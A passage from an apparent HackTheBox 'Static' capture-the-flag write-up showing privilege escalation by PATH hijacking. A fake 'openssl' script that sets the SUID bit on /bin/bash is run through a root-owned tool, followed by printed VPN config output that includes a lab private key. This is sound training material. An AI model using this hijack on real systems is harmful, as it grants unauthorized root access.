s`<span class="variable">$EASYRSA_REQ_OU</span>`My Organizational Unit`g -e s`<span class="variable">$EASYRSA_REQ_CN</span>`a`g -e s`<span class="variable">$EASYRSA_REQ_EMAIL</span>`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf                   </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1979   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`<span class="variable">$dir</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_PKI</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_CERT_EXPIRE</span>`36500`g -e s`<span class="variable">$EASYRSA_CRL_DAYS</span>`180`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_KEY_SIZE</span>`2048`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_DN</span>`cn_only`g -e s`<span class="variable">$EASYRSA_REQ_COUNTRY</span>`US`g -e s`<span class="variable">$EASYRSA_REQ_PROVINCE</span>`California`g -e s`<span class="variable">$EASYRSA_REQ_CITY</span>`San Francisco`g -e s`<span class="variable">$EASYRSA_REQ_ORG</span>`Copyleft Certificate Co`g -e s`<span class="variable">$EASYRSA_REQ_OU</span>`My Organizational Unit`g -e s`<span class="variable">$EASYRSA_REQ_CN</span>`a`g -e s`<span class="variable">$EASYRSA_REQ_EMAIL</span>`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf                   </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1980   | <span class="built_in">mktemp</span> /opt/easyrsa/pki/private/a.key.XXXXXXXXXX </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1981   | <span class="built_in">mktemp</span> /opt/easyrsa/pki/reqs/a.req.XXXXXXXXXX </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1982   | </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1983   | <span class="built_in">mv</span> /opt/easyrsa/pki/private/a.key.33iSNpJtMR /opt/easyrsa/pki/private/a.key </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1984   | <span class="built_in">mv</span> /opt/easyrsa/pki/reqs/a.req.LRpyW6OLtM /opt/easyrsa/pki/reqs/a.req </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1985   | openssl rand -hex -out /opt/easyrsa/pki/serial 16 </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1986   | <span class="built_in">cat</span> /opt/easyrsa/pki/serial </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1987   | openssl ca -config /opt/easyrsa/pki/openssl-easyrsa.cnf -status 0ba01fbfb70e2b33dbb917bb6479ed87                                                                                                                     </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1988   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`<span class="variable">$dir</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_PKI</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_CERT_EXPIRE</span>`36500`g -e s`<span class="variable">$EASYRSA_CRL_DAYS</span>`180`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_KEY_SIZE</span>`2048`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_DN</span>`cn_only`g -e s`<span class="variable">$EASYRSA_REQ_COUNTRY</span>`US`g -e s`<span class="variable">$EASYRSA_REQ_PROVINCE</span>`California`g -e s`<span class="variable">$EASYRSA_REQ_CITY</span>`San Francisco`g -e s`<span class="variable">$EASYRSA_REQ_ORG</span>`Copyleft Certificate Co`g -e s`<span class="variable">$EASYRSA_REQ_OU</span>`My Organizational Unit`g -e s`<span class="variable">$EASYRSA_REQ_CN</span>`a`g -e s`<span class="variable">$EASYRSA_REQ_EMAIL</span>`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf                   </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1989   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1990   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1991   | openssl req -<span class="keyword">in</span> /opt/easyrsa/pki/reqs/a.req -noout -subject -nameopt multiline</span><br></pre></td></tr></table></figure>

<p>So we can use that for Privilege escalation using path injection</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2xpbnV4LXByaXZpbGVnZS1lc2NhbGF0aW9uLXVzaW5nLXBhdGgtdmFyaWFibGUv">Linux Privilege Escalation Using PATH Variable<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Now i create a file called openssl with the bash content inside in my local machiene.</p>
<h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now base64 encode this and copy the base64 string.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># cat openssl | base64</span></span><br><span class="line">IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=</span><br></pre></td></tr></table></figure>

<p>Create a directory inside &#x2F;tmp folder called pwn</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:/tmp$ <span class="built_in">mkdir</span> pwn</span><br><span class="line"><span class="built_in">mkdir</span> pwn</span><br><span class="line">www-data@pki:/tmp$ <span class="built_in">cd</span> pwn</span><br><span class="line"><span class="built_in">cd</span> pwn</span><br><span class="line">www-data@pki:/tmp/pwn$</span><br></pre></td></tr></table></figure>

<p>Now paste that base64 encode string and decode it and save that output in a file called openssl</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:/tmp/pwn$ <span class="built_in">echo</span> <span class="string">&quot;IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=&quot;</span> | <span class="built_in">base64</span> -d &gt; openssl</span><br><span class="line">&lt;Y2htb2QgdStzIC9iaW4vYmFzaAo=<span class="string">&quot; | base64 -d &gt; openssl</span></span><br><span class="line"><span class="string">www-data@pki:/tmp/pwn$ cat openssl</span></span><br><span class="line"><span class="string">cat openssl</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">chmod u+s /bin/bash</span></span><br><span class="line"><span class="string">www-data@pki:/tmp/pwn$ chmod 755 openssl</span></span><br><span class="line"><span class="string">chmod 755 openssl</span></span><br><span class="line"><span class="string">www-data@pki:/tmp/pwn$ ls -la</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 www-data www-data 4096 Jun 26 12:14 .</span></span><br><span class="line"><span class="string">drwxrwxrwt 1 root     root     4096 Jun 26 12:13 ..</span></span><br><span class="line"><span class="string">-rwxr-xr-x 1 www-data www-data   32 Jun 26 12:14 openssl</span></span><br><span class="line"><span class="string">www-data@pki:/tmp/pwn$ export PATH=/tmp/pwn:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">export PATH=/tmp/pwn:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">www-data@pki:/tmp/pwn$ echo <span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">echo <span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">/tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br></pre></td></tr></table></figure>

<p>Now just run the ersatool binary and check the &#x2F;bin&#x2F;bash binary as shown</p>
<p>And we see that &#x2F;bin&#x2F;bash binary permission has been changed to suid bit set.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:/tmp/pwn$ ersatool</span><br><span class="line">ersatool</span><br><span class="line"><span class="comment"># create</span></span><br><span class="line">create</span><br><span class="line">create-&gt;CN=a</span><br><span class="line">a</span><br><span class="line">client</span><br><span class="line">dev tun9</span><br><span class="line">proto udp</span><br><span class="line">remote vpn.static.htb 1194</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">user nobody</span><br><span class="line">group nogroup</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line">remote-cert-tls server</span><br><span class="line"></span><br><span class="line">cipher AES-256-CBC</span><br><span class="line"><span class="comment">#auth SHA256</span></span><br><span class="line">key-direction 1</span><br><span class="line">verb 3</span><br><span class="line">&lt;ca&gt;</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL</span><br><span class="line">BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw</span><br><span class="line">MjI3MTAxNjAxWjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3cwggEiMA0GCSqGSIb3DQEB</span><br><span class="line">AQUAA4IBDwAwggEKAoIBAQDCA/rLO4l5goACROYshzlVowO7hAl+EDgAUof3VSph</span><br><span class="line">1UF2OCCr2J2xpOkkWHKFPCTl+fCtLcxKZdb5zQBKhIvxJ3Tzqe18whu23aI8Imol</span><br><span class="line">AQcqZcaSMTRXAp8HKsrxpXl8TtbZ2y4nAVR0YXAWOadSMQtmztiOgzDAP+FbqZQf</span><br><span class="line">CnKBW+yxNxjlrD/VpVf/C9GnXDn+QH2ezoOYCid6+ANuiSTqks3FzEnUrwuVMgxp</span><br><span class="line">MW94Sw/2d8WbUfD5DxKvyHObjDwwZn54ZNz8WEXzTfqTtFD1ghNsvVJgvsDmyMYh</span><br><span class="line">7nDfRSxNc3cEY8FOVvvaA3BvPP06xVEz0GrJkfUNjyvFAgMBAAGjgY4wgYswHQYD</span><br><span class="line">VR0OBBYEFKHag2AygX8bgBngIC3WYMil7YJUME8GA1UdIwRIMEaAFKHag2AygX8b</span><br><span class="line">gBngIC3WYMil7YJUoRikFjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3eCFEfpmK1xyTkV</span><br><span class="line">eLW4PNbEEu0X42CuMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgEGMA0GCSqGSIb3</span><br><span class="line">DQEBCwUAA4IBAQAG/yziZ6ae3f//fsOmU0GBLwKzWGzQxdykHAwN6452Mt3FHT7A</span><br><span class="line">0+aT+C9DWmx4r71PD8RIDI9eDdOu9RZ8VoutZuZrhca5SpLoGfIFnmveNzy0mcf7</span><br><span class="line">a/AQCH/XSOr8+FkF6UGXUK80lylqe3R/1YXct3htZZEPuSBDdi6zPMrq4UaGCPkY</span><br><span class="line">bOFXVZZA7KHkzt5F8ajGs7xbTNTarOsPjdhN75dMfnG1w8upw1DLb1LE8QTP00fQ</span><br><span class="line">i0wzJtUvYetL96vt/mbo8AuYZmWWmOzm1mJLNn4UbhG65/mHfBWHduRy1YZeeiuI</span><br><span class="line">qYSaD5L082aZQj/S+qfTgkRiT2nduN1pZURn</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">&lt;/ca&gt;</span><br><span class="line">&lt;cert&gt;</span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number:</span><br><span class="line">            0b:a0:1f:bf:b7:0e:2b:33:db:b9:17:bb:64:79:ed:87</span><br><span class="line">        Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: CN=static-gw</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Jun 26 11:49:27 2021 GMT</span><br><span class="line">            Not After : Jun  2 11:49:27 2121 GMT</span><br><span class="line">        Subject: CN=a</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: rsaEncryption</span><br><span class="line">                RSA Public-Key: (2048 bit)</span><br><span class="line">                Modulus:</span><br><span class="line">                    00:c7:78:a3:56:5c:6f:6e:9a:23:80:90:9d:2d:38:</span><br><span class="line">                    12:e0:12:<span class="built_in">cd</span>:62:4d:cc:2f:05:9f:75:f8:ca:9e:7f:</span><br><span class="line">                    1a:de:ea:c4:d2:fe:1d:0f:d3:91:b9:8f:ab:b5:6e:</span><br><span class="line">                    3d:f0:50:4c:73:d3:99:bb:46:7a:3f:71:24:5e:85:</span><br><span class="line">                    82:5b:<span class="built_in">fc</span>:70:05:01:5d:cb:e0:7d:2e:96:21:1d:c5:</span><br><span class="line">                    cb:30:70:78:0e:dc:c5:aa:cf:6b:4b:fb:6e:ee:90:</span><br><span class="line">                    cc:8a:99:da:25:ec:6c:e1:1d:c6:cb:ac:29:b0:51:</span><br><span class="line">                    78:71:ce:76:b5:00:b8:c8:35:e2:5b:d3:c8:af:dc:</span><br><span class="line">                    81:75:a8:e1:fd:40:e3:fd:06:4e:8a:7b:79:51:5c:</span><br><span class="line">                    6e:83:79:6b:1a:a3:5a:eb:87:54:da:b2:60:cb:cb:</span><br><span class="line">                    dc:<span class="built_in">fc</span>:a2:15:9c:1b:a2:1f:2a:8e:b0:9c:e9:97:68:</span><br><span class="line">                    a9:d9:32:ff:26:47:31:13:b6:4b:4a:85:1f:84:7d:</span><br><span class="line">                    82:39:9c:2a:e1:c7:a8:9b:62:36:6f:4c:ab:88:cc:</span><br><span class="line">                    f4:c9:78:c5:a0:17:98:22:f7:be:ae:fa:79:bb:3f:</span><br><span class="line">                    54:41:a1:<span class="built_in">fc</span>:5c:fb:4d:18:50:78:a5:ef:f3:1b:75:</span><br><span class="line">                    25:19:06:dc:65:9e:6d:b1:15:28:d7:c5:12:c8:<span class="built_in">df</span>:</span><br><span class="line">                    b6:7f:18:15:d1:84:22:80:9a:fd:a3:02:d8:29:b8:</span><br><span class="line">                    5c:45</span><br><span class="line">                Exponent: 65537 (0x10001)</span><br><span class="line">        X509v3 extensions:</span><br><span class="line">            X509v3 Basic Constraints: </span><br><span class="line">                CA:FALSE</span><br><span class="line">            X509v3 Subject Key Identifier: </span><br><span class="line">                2A:01:B8:D8:81:81:98:69:C8:1D:65:D5:F5:9D:87:05:5D:74:8C:32</span><br><span class="line">            X509v3 Authority Key Identifier: </span><br><span class="line">                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54</span><br><span class="line">                DirName:/CN=static-gw</span><br><span class="line">                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE</span><br><span class="line"></span><br><span class="line">            X509v3 Extended Key Usage: </span><br><span class="line">                TLS Web Client Authentication</span><br><span class="line">            X509v3 Key Usage: </span><br><span class="line">                Digital Signature</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">         72:6f:3b:22:41:74:74:b1:c9:ae:b1:21:ef:74:8d:76:45:d6:</span><br><span class="line">         f5:1b:<span class="built_in">dd</span>:29:94:d9:<span class="built_in">fc</span>:2f:d6:f9:80:f7:ec:33:c5:bd:7c:82:</span><br><span class="line">         9f:ec:74:5b:de:bf:88:b3:fa:7a:c9:0f:bb:d1:a2:4a:80:04:</span><br><span class="line">         36:a6:13:07:af:6b:80:e6:4c:39:2e:66:a6:ce:89:f4:bc:e4:</span><br><span class="line">         6c:29:75:48:94:43:96:db:46:34:01:86:<span class="built_in">df</span>:26:74:de:13:3a:</span><br><span class="line">         3d:a3:e5:28:6c:e2:65:ab:ed:51:41:7f:1c:b7:c4:42:c2:61:</span><br><span class="line">         eb:a5:<span class="built_in">cd</span>:d4:72:b0:5b:82:cc:25:8c:c7:2e:31:a1:95:e7:14:</span><br><span class="line">         1c:50:cf:20:7b:b4:a7:19:e6:46:4f:8d:1f:da:b8:c4:ad:c0:</span><br><span class="line">         b5:37:94:02:57:a7:86:c8:9a:45:65:65:54:32:4a:05:36:03:</span><br><span class="line">         2a:66:fd:48:2e:87:1a:ef:6f:b2:fa:0b:6a:20:58:46:d3:04:</span><br><span class="line">         60:b9:26:67:0e:9e:16:3f:4c:c0:d4:de:da:b4:3e:e0:eb:b5:</span><br><span class="line">         0d:6f:50:14:f6:25:77:2d:97:02:c6:c4:a9:f6:8b:1d:b1:35:</span><br><span class="line">         2e:c3:a9:de:01:86:22:04:90:f4:5e:4c:6f:96:30:f0:2c:95:</span><br><span class="line">         e3:33:98:bb:55:7d:69:59:9c:73:e7:19:7d:96:6c:8c:eb:b7:</span><br><span class="line">         3a:90:e6:17</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIDTTCCAjWgAwIBAgIQC6Afv7cOKzPbuRe7ZHnthzANBgkqhkiG9w0BAQsFADAU</span><br><span class="line">MRIwEAYDVQQDDAlzdGF0aWMtZ3cwIBcNMjEwNjI2MTE0OTI3WhgPMjEyMTA2MDIx</span><br><span class="line">MTQ5MjdaMAwxCjAIBgNVBAMMAWEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK</span><br><span class="line">AoIBAQDHeKNWXG9umiOAkJ0tOBLgEs1iTcwvBZ91+Mqefxre6sTS/h0P05G5j6u1</span><br><span class="line">bj3wUExz05m7Rno/cSRehYJb/HAFAV3L4H0uliEdxcswcHgO3MWqz2tL+27ukMyK</span><br><span class="line">mdol7GzhHcbLrCmwUXhxzna1ALjINeJb08iv3IF1qOH9QOP9Bk6Ke3lRXG6DeWsa</span><br><span class="line">o1rrh1TasmDLy9z8ohWcG6IfKo6wnOmXaKnZMv8mRzETtktKhR+EfYI5nCrhx6ib</span><br><span class="line">YjZvTKuIzPTJeMWgF5gi976u+nm7P1RBofxc+00YUHil7/MbdSUZBtxlnm2xFSjX</span><br><span class="line">xRLI37Z/GBXRhCKAmv2jAtgpuFxFAgMBAAGjgaAwgZ0wCQYDVR0TBAIwADAdBgNV</span><br><span class="line">HQ4EFgQUKgG42IGBmGnIHWXV9Z2HBV10jDIwTwYDVR0jBEgwRoAUodqDYDKBfxuA</span><br><span class="line">GeAgLdZgyKXtglShGKQWMBQxEjAQBgNVBAMMCXN0YXRpYy1nd4IUR+mYrXHJORV4</span><br><span class="line">tbg81sQS7RfjYK4wEwYDVR0lBAwwCgYIKwYBBQUHAwIwCwYDVR0PBAQDAgeAMA0G</span><br><span class="line">CSqGSIb3DQEBCwUAA4IBAQBybzsiQXR0scmusSHvdI12Rdb1G90plNn8L9b5gPfs</span><br><span class="line">M8W9fIKf7HRb3r+Is/p6yQ+70aJKgAQ2phMHr2uA5kw5Lmamzon0vORsKXVIlEOW</span><br><span class="line">20Y0AYbfJnTeEzo9o+UobOJlq+1RQX8ct8RCwmHrpc3UcrBbgswljMcuMaGV5xQc</span><br><span class="line">UM8ge7SnGeZGT40f2rjErcC1N5QCV6eGyJpFZWVUMkoFNgMqZv1ILoca72+y+gtq</span><br><span class="line">IFhG0wRguSZnDp4WP0zA1N7atD7g67UNb1AU9iV3LZcCxsSp9osdsTUuw6neAYYi</span><br><span class="line">BJD0XkxvljDwLJXjM5i7VX1pWZxz5xl9lmyM67c6kOYX</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">&lt;/cert&gt;</span><br><span class="line">&lt;key&gt;</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDHeKNWXG9umiOA</span><br><span class="line">kJ0tOBLgEs1iTcwvBZ91+Mqefxre6sTS/h0P05G5j6u1bj3wUExz05m7Rno/cSRe</span><br><span class="line">hYJb/HAFAV3L4H0uliEdxcswcHgO3MWqz2tL+27ukMyKmdol7GzhHcbLrCmwUXhx</span><br><span class="line">zna1ALjINeJb08iv3IF1qOH9QOP9Bk6Ke3lRXG6DeWsao1rrh1TasmDLy9z8ohWc</span><br><span class="line">G6IfKo6wnOmXaKnZMv8mRzETtktKhR+EfYI5nCrhx6ibYjZvTKuIzPTJeMWgF5gi</span><br><span class="line">976u+nm7P1RBofxc+00YUHil7/MbdSUZBtxlnm2xFSjXxRLI37Z/GBXRhCKAmv2j</span><br><span class="line">AtgpuFxFAgMBAAECggEAWYKwQVPPiWFP5yR988nC5pxpX+CrbLpoOUdAnWlKRJgz</span><br><span class="line">ZL81iWGWdh+bnRnwX4OZGyzsQpa4yvlZqbTdr6uTFRvs3E1Lv3kNOVAGAyGlLn4x</span><br><span class="line">kZnsezdEK3f84YFy3CvBHDABgmoqdv3IP8G3kTfWs7lCb5SU7R3VVlhHuR7CcEr1</span><br><span class="line">2t3sVotmzmKLyYj1Dm8+9iGCk5e9xhVkW5BzqimYmZK/XCZqzCugw91KFPuSQCdb</span><br><span class="line">fRA7EBKAKyrXdMFfgm38xFTlL2TuyAlVymKoneFICA6px1Wc+vac23zLk6HurxLe</span><br><span class="line">YMGypeEAS9UmmDFczmQ3XZqAO6mc1EpCqAbUTcR5jQKBgQDzZ5FGe/Wx7XCaJAh9</span><br><span class="line">ua6xJD3Kg1cZkvvBg1whGdk+O+JybEvxp6Sfditwt1EVdd8xoga1DlIY3IjIho5Z</span><br><span class="line">YujWpf5xy9Ks1PExSiEZqvJSO4KHTWRsSWp54PLzlL225aimmzRJKtC6IPLK1x4W</span><br><span class="line">BSg7iaTrbFDkh1EKU3byPGFcmwKBgQDRyxOSHwUtwCUxRc/zF7Y1YDisoJ2hF1Op</span><br><span class="line">6L4eMIsiPZkFrQZbdvkutdgq7EWICpYtN5u8IZHiD1EmZwLidK/QcZhCPepbxwOi</span><br><span class="line">3oKVB214bvUPr2qxzXXtwaK7Mt7o8Jc3eN5tdFhtt43yQpDICGo6JyoL6xcfCac0</span><br><span class="line">o0zNgUEInwKBgQDqC5ckaEOLEB4rCSTlB6uTh56m4P3aiHvtykrHRVygO+L1VW78</span><br><span class="line">8c8Yyf7hRlQAR7QSvJKofBmy8DPSZZfxGWt8Imb0syFjsOovE/GaBcc2DSToxyEe</span><br><span class="line">AsYQZZ4XW9nESTaO5UQ0aqgDoXT0WD8Eu3bBMQxUl3V9GSRywmjoaejQqwKBgHMs</span><br><span class="line">hMsEgqhSQ1jglcBENUDqWVLUPpVwo/q0jqMuTUP4Ayktiz7tevFc3Zb67VU5Uqby</span><br><span class="line">T2oiF9++PvPRO7EtFFRf+JHtQdsuz907QP8l+8BRUfJRgEaqoGJtmrQgwmWpp6rJ</span><br><span class="line">jXsTk3Rwf9oPF0Lp87+HPrsaTjA48XWhbQmpOxXLAoGAVA9Rml+mDg/az1AkQ2GV</span><br><span class="line">/NS0EomOtLa22ZsH95gRvq8Ax33rghmFHeECbbvwiS5TKexrGdOqBvvtLqSi0HHD</span><br><span class="line">SrTcrWv15LlhI1c+d+IRDklkHS0DpNW9dSULyGDuxHmsou10bmNaElVuY67lz3TS</span><br><span class="line">6qNVEFTOuKZjgJ9/JCDtK8U=</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line">&lt;/key&gt;</span><br><span class="line">key-direction 1</span><br><span class="line">&lt;tls-auth&gt;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2048 bit OpenVPN static key</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">-----BEGIN OpenVPN Static key V1-----</span><br><span class="line">09a194dc6aee4ae65459c682cc0b25e9</span><br><span class="line">43e54d75dd1d83653ef04a67c65177da</span><br><span class="line">98df768c86585611755082c6b06da8d9</span><br><span class="line">21a4e3afd8d4537c3be9cf3c91a31ddd</span><br><span class="line">157c9ff3f99c5f098ca8be7fe4e01435</span><br><span class="line">86ac1e6b62d126d9f31bf603cd822e26</span><br><span class="line">4a0dfdcb5aa5e66d97cd7b338e7dc07a</span><br><span class="line">62a7691b4fc80830c169f27486f9f22e</span><br><span class="line">4b71185dda7c5adac7ed55b80190dd35</span><br><span class="line">3ec31228f556903d23dbf12d3928578d</span><br><span class="line">c7fe5488d77ab72a0f50ae8d975af87e</span><br><span class="line">ec0dbce0f9f7bf2c01aff9c9cf4fcc99</span><br><span class="line">aaca4a1e81a0a240565c356cd33c6163</span><br><span class="line">f7d986e0395ea90a439b176542a42009</span><br><span class="line">2aafeb626aadb6abc35fa023426c9334</span><br><span class="line">ea5f5af8329f367f112599f3e668bd7a</span><br><span class="line">-----END OpenVPN Static key V1-----</span><br><span class="line">&lt;/tls-auth&gt;</span><br><span 